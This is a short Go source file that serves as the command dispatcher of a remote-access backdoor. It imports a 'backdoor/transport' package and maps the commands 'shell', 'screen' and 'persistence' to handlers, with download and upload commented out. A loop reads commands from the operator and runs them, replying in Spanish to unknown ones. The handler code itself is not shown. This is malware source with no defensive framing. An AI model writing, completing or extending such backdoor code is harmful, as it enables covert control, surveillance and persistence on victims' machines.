package handler

import (
	"backdoor/transport"
	"strings"
)

type CommandHandler func(t transport.Transport)

var Registry = map[string]CommandHandler{
	"shell":  ShellHandler,
	"screen": ScreenshotHandler,
	"persistence": PersistenceHandler,
	// "download": DownloadHandler,
	// "upload":   UploadHandler,
}

func Handle(t transport.Transport) {
	for {
		input, err := t.Read()
		if err != nil {
			return
		}
		command := strings.TrimSpace(string(input))
		if handler, ok := Registry[command]; ok {
			handler(t)
		} else {
			t.Write([]byte("Comando no reconocido\n"))
		}
	}
}
